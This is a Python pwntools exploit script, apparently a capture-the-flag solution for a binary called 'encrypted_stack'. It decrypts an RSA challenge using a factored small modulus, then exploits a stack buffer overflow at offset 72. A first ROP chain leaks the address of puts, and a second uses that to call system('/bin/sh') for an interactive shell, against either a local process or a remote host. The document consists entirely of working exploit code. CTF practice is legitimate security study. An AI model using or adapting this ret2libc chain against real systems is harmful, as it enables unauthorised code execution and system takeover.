#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *
import gmpy2

local_file  = './encrypted_stack'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# crypto RSA
e = 65537
N = 94576960329497431 
# p*q=N - crack by yafu
p1 = 261571747
p2 = 361571773
d = gmpy2.invert(e, (p1-1)*(p2-1))
print d

def rsa():
    c = eval(rc())
    print "c="+str(c)
    m = str(pow(c, d, N))
    sl(m)
    ru(m)

ru('Please use your key to encrypt it\n')
for i in range(20):
    rsa()

# gadget
prdi = 0x000000000040095a # pop rdi ; ret
ret  = prdi+1

# elf, libc
vuln = 0x400B30
puts_plt = elf.sym['puts']
puts_got = elf.got['puts']
offset_puts = libc.sym['puts']

# rop1
offset = 72
payload = 'A'*offset
payload += p64(prdi) + p64(puts_got) + p64(puts_plt) + p64(vuln) 

ru('P1z inpu1t you name:\n')

sl(payload)
puts = uu64(rc(6))
libc_base = puts - offset_puts
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()

payload2 = 'B'*offset
payload2 += p64(ret) + p64(prdi) + p64(binsh) + p64(system)
# debug()
sl(payload2)

p.interactive()

